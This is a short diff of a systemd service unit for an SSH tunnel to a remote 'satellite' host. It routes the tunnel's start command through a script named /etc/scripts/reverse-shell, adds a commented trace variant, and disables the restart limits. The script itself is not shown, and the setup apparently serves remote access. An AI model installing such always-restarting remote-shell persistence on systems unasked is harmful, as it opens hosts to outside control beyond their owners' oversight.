@@ -8,17 +8,19 @@ Environment=RR_SSH_GATETIME=10
 EnvironmentFile=-/etc/environment.inherited
 EnvironmentFile=/etc/environment.tunnel
 EnvironmentFile=/etc/default/ssh-tunnel
-ExecStart=/usr/local/bin/rr-ssh -q \
+#ExecStart=/etc/scripts/trace /etc/scripts/reverse-shell 
+ExecStart=/etc/scripts/reverse-shell /usr/local/bin/rr-ssh -q \
 	-o "ServerAliveInterval=3" \
 	-o "ServerAliveCountMax=5" \
-	$SSH_TUNNEL_OPTIONS \
-	$SATELLITE_SSH_EXTRA_OPTIONS \
+	-o "ControlMaster=yes" \
+	${SSH_TUNNEL_OPTIONS} \
+	${SATELLITE_SSH_EXTRA_OPTIONS} \
 	"${SATELLITE_REMOTE_USER}@${SATELLITE_REMOTE_HOST}"
 #ExecStop=killall -s KILL autossh
 Restart=always
-RestartSec=7
-StartLimitBurst=5
-StartLimitIntervalSec=30
+RestartSec=11
+#StartLimitBurst=5
+#StartLimitIntervalSec=30
 
 [Install]
 WantedBy=multi-user.target
